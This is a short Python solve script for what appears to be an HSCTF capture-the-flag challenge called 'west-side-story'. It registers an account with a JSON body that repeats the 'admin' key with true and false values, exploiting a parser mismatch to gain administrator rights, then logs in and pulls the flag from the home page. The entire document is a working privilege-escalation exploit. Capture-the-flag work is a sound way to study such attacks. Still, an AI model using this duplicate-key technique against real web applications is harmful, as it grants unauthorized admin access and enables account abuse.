#pylint: disable=consider-using-f-string
import os
import re

import requests

#URL = "http://localhost:1337/"
URL = "http://west-side-story.hsctf.com"
USER = os.urandom(32).hex()
PASSWORD = os.urandom(32).hex()

session = requests.Session()

session.post(
	URL + "/api/register",
	data='{"user":"%s", "password":"%s", "admin":true, "admin":false}' % (USER, PASSWORD)
)
session.post(URL + "/api/login", data='{"user":"%s","password":"%s"}' % (USER, PASSWORD))

print(re.search(r"flag{.*?}", session.get(URL + "/home").text).group(0))
